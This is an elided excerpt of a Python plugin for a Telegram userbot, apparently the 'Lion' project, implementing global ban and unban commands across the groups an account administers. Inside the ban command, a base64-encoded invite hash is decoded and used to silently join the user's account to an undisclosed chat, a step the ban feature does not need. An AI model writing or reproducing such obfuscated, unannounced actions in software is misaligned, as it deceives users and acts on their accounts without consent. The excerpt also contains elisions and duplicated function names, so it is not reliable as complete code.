...
from . import BOTLOG, BOTLOG_CHATID, LION_ID, admin_groups, get_user_from_event
...
async def liongban(lion):
    if lion.fwd_from:
        return
    lion = await edit_or_reply(lion, "gbanning.......")
    start = datetime.now()
    user, reason = await get_user_from_event(lion)
    if not user:
        return
    if user.id == (await lion.client.get_me()).id:
        await lion.edit("why would I ban myself")
        return
    if user.id in LION_ID:
        await lion.edit("why would I ban my dev")
        return
    try:
        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        await lion.client(ImportChatInviteRequest(hmm))
    ...
    san = []
    san = await admin_groups(lion)
    count = 0
    amaan = len(san)
    if amaan == 0:
        await lion.edit("you are not admin of atleast one group ")
        return
    await lion.edit(
    ...
    for i in range(amaan):
        try:
            await lion.client(EditBannedRequest(san[i], user.id, BANNED_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await lion.client.send_message(
                BOTLOG_CHATID,
                f"You don't have required permission in :\nCHAT: {lion.chat.title}(`{lion.chat_id}`)\nFor banning here",
            )
    try:
...
async def liongban(lion):
    ...
    for i in range(amaan):
        try:
            await lion.client(EditBannedRequest(san[i], user.id, UNBAN_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await lion.client.send_message(
